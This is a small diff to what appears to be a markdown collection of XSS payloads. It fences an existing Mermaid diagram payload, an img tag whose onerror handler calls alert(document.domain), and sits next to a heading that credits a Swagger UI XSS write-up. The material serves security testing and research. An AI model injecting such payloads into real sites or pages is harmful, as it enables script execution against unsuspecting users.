@@ -264,10 +264,12 @@ If you can get an XSS with any payload from here, please let me know, I'll be ha
 ```
 
 ### Mermaid XSS
+```markdown
 \`\`\`mermaid
 graph LR
      id1["<img src=x onerror=alert#lpar;document.domain#rpar;>"]
 \`\`\`
+```
 
 ### Swagger XSS (Credits to Dawid Moczadło - [https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/))
 
